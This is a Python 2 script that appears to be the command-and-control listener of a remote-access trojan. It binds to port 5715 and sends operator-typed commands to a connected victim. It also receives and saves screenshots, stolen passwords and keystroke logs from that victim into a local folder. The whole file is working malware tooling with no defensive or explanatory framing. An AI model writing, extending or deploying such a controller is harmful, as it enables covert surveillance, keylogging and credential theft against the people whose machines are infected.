import socket
import sys
import signal
from PIL import Image
from StringIO import StringIO
import threading, time

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

def getSizeOfCommand(s):
    sizearray = []
    size = 1
    data = s.recv(1)
    if data == "!":
        data = None
        while data != "!":
            data = s.recv(size)
            if data != "!" and data != "\n":
                sizearray.append(data)
    size = 0
    for i in range(0,len(sizearray)):
        size += int(sizearray[i]) * pow(10,len(sizearray)-i-1)
    return size

def getTypeOfCommand(s):
    data = s.recv(1)
    if data == "!":
        data = None
        data = s.recv(3)
        return data

def getData(s,size):
    return s.recv(size)

def send(client):
    cmd = raw_input("Enter command: ")
    inp = "!" + str(len(cmd)) + "!" + cmd
    client.send(inp)

def receive(s):
    base = "C:\Users\Matt\Desktop\\testfolder"
    while True:
        state = getTypeOfCommand(s)
        size = getSizeOfCommand(s)
        data = getData(s,size)
        t = time.time()
        if state == "143":
            path = base + "\screenshot." + str(t) + ".png"
            im = Image.open(StringIO(data))
            im.save("C:\Users\Matt\Desktop\\testpic.png",'png')
            # f = open(path,"w")
            # f.write(data)
            # f.close()
        elif state == "144":
            path = base + "\passwords." + str(t) + ".txt"
            f = open(path,"w")
            f.write(data)
            f.close()
        elif state == "145":
            path = base + "\keystrokes." + str(t) + ".txt"
            f = open(path,"w")
            f.write(data)
            f.close()
        else:
            print "don't know that one"

host = '0.0.0.0'
port = 5715 
backlog = 5
size = 1
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host,port))
s.listen(backlog)
client, address = s.accept()

threading.Thread(target=receive,args=[client]).start()

while 1:
    send(client)


